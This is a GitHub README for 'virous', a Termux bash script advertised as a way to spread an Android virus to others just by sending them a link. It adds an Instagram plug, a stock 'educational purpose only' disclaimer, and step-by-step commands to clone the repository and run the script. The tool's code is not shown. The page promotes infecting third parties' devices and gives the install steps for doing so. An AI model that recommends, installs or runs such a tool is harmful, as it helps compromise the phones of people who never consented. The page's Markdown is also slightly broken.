
<h1 align="center">virous v1.1</h1>
<p align="center">
     A new way to spread a fun as virus by just sending link in android.
</p>

## ?? ***About virous***:

Virous is a bash based script which is officially made for termux users and from this tool you can spread android virus by just sending link. This tool works on both rooted Android device and Non-rooted Android device.

![ ](https://github.com/shubhamggosai/virous/blob/master/ShuBham/Screenshot_20200920_151348.jpg)

FIND...ME.


Instagram account
👉[![Instagram  ](https://img.shields.io/badge/INSTAGRAM-FOLLOW-red?style=for-the-badge&logo=instagram)](https://www.instagram.com/shubhamg0sain)👈


### ?? Warning

***This tool is only for educational purpose. If you use this tool for other purposes except education we will not be responsible in such cases.***
apt-get update -y
```
### Installation

 apt-get upgrade -y

 pkg install python -y 

 pkg install python2 -y

 pkg install git -y

 pip install lolcat

 git clone https://github.com/ShuBhamg0sain/virous.git

 ls

 cd virous

 ls

 bash Virous.sh
